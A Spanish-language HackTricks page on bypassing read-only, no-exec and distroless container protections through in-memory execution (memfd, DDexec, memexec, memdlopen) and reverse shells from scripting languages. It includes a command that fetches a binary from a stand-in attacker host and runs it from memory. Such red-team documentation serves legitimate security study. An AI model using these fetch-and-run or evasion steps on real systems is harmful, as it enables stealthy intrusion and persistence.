# Bypass FS protections: read-only / no-exec / Distroless

{{#include ../../../banners/hacktricks-training.md}}


## Videos

En los siguientes videos puedes encontrar las técnicas mencionadas en esta página explicadas con más profundidad:

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## read-only / no-exec scenario

Es cada vez más común encontrar máquinas linux montadas con **read-only (ro) file system protection**, especialmente en contenedores. Esto es porque ejecutar un contenedor con el file system en ro es tan fácil como poner **`readOnlyRootFilesystem: true`** en el `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Sin embargo, aunque el file system esté montado como ro, **`/dev/shm`** seguirá siendo escribible, así que no es cierto que no podamos escribir nada en el disco. No obstante, esta carpeta estará **mounted with no-exec protection**, por lo que si descargas un binario aquí **no podrás ejecutarlo**.

> [!WARNING]
> Desde la perspectiva de un red team, esto hace que sea **complicado descargar y ejecutar** binarios que no estén ya en el sistema (como backdoors o enumeradores como `kubectl`).

## Easiest bypass: Scripts

Ten en cuenta que he hablado de binarios; puedes **ejecutar cualquier script** siempre que el intérprete esté dentro de la máquina, como un **shell script** si `sh` está presente o un **python** **script** si `python` está instalado.

Sin embargo, esto no es suficiente para ejecutar tu backdoor binario u otras herramientas binarias que puedas necesitar.

## Memory Bypasses

Si quieres ejecutar un binario pero el file system no lo permite, la mejor forma es **ejecutarlo desde memoria**, ya que **las protecciones no se aplican ahí**.

### FD + exec syscall bypass

Si tienes algunos motores de scripting potentes dentro de la máquina, como **Python**, **Perl**, o **Ruby**, podrías descargar el binario para ejecutarlo desde memoria, almacenarlo en un file descriptor de memoria (`create_memfd` syscall), que no estará sujeto a esas protecciones y luego llamar a un **`exec` syscall** indicando el **fd como el archivo a ejecutar**.

Para esto puedes usar fácilmente el proyecto [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Le pasas un binario y generará un script en el lenguaje indicado con el **binario comprimido y b64 encoded** y las instrucciones para **decodificar y descomprimirlo** en un **fd** creado llamando al `create_memfd` syscall y una llamada al **exec** syscall para ejecutarlo.

> [!WARNING]
> Esto no funciona en otros lenguajes de script como PHP o Node porque no tienen una manera por defecto de llamar a syscalls crudos desde un script, por lo que no es posible llamar a `create_memfd` para crear el **memory fd** donde almacenar el binario.
>
> Además, crear un **fd regular** con un archivo en `/dev/shm` no funcionará, ya que no se te permitirá ejecutarlo porque se aplicará la protección no-exec.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) es una técnica que permite **modificar la memoria de tu propio proceso** sobrescribiendo su **`/proc/self/mem`**.

Por lo tanto, **controlando el código ensamblador** que está ejecutando el proceso, puedes escribir un **shellcode** y "mutar" el proceso para **ejecutar cualquier código arbitrario**.

> [!TIP]
> **DDexec / EverythingExec** te permitirá cargar y **ejecutar** tu propio **shellcode** o **cualquier binary** desde la **memoria**.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Para más información sobre esta técnica consulta el Github o:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) es el siguiente paso natural de DDexec. Es un **DDexec shellcode demonised**, así que cada vez que quieras **run a different binary** no necesitas relanzar DDexec; puedes simplemente ejecutar el shellcode de memexec vía la técnica DDexec y luego **communicate with this deamon to pass new binaries to load and run**.

Puedes encontrar un ejemplo de cómo usar **memexec to execute binaries from a PHP reverse shell** en [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Con un propósito similar al de DDexec, la técnica [**memdlopen**](https://github.com/arget13/memdlopen) permite una **easier way to load binaries** en memoria para ejecutarlos después. Incluso podría permitir cargar binarios con dependencias.

## Distroless Bypass

Para una explicación dedicada de **qué es distroless realmente**, cuándo ayuda, cuándo no, y cómo cambia el tradecraft de post-exploitation en contenedores, consulta:

{{#ref}}
../../privilege-escalation/container-security/distroless.md
{{#endref}}

### What is distroless

Los contenedores distroless contienen sólo los **componentes mínimos necesarios para ejecutar una aplicación o servicio específico**, como librerías y dependencias de runtime, pero excluyen componentes más grandes como un package manager, shell, o utilidades del sistema.

El objetivo de los contenedores distroless es **reducir la superficie de ataque de los contenedores eliminando componentes innecesarios** y minimizando el número de vulnerabilidades que pueden ser explotadas.

### Reverse Shell

En un contenedor distroless puede que **ni siquiera encuentres `sh` o `bash`** para obtener un shell regular. Tampoco encontrarás binarios como `ls`, `whoami`, `id`... todo lo que normalmente ejecutas en un sistema.

> [!WARNING]
> Therefore, you **won't** be able to get a **reverse shell** or **enumerate** the system as you usually do.

Sin embargo, si el contenedor comprometido está ejecutando por ejemplo una app flask, entonces python está instalado, y por lo tanto puedes obtener una **Python reverse shell**. Si está ejecutando node, puedes obtener una Node rev shell, y lo mismo con casi cualquier **scripting language**.

> [!TIP]
> Using the scripting language you could **enumerate the system** using the language capabilities.

Si no existen protecciones de **`read-only/no-exec`** podrías abusar de tu reverse shell para **write in the file system your binaries** y **execute** them.

> [!TIP]
> However, in this kind of containers these protections will usually exist, but you could use the **previous memory execution techniques to bypass them**.

Puedes encontrar **examples** sobre cómo **exploit some RCE vulnerabilities** para obtener **reverse shells** de lenguajes de scripting y ejecutar binarios desde memoria en [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).


{{#include ../../../banners/hacktricks-training.md}}
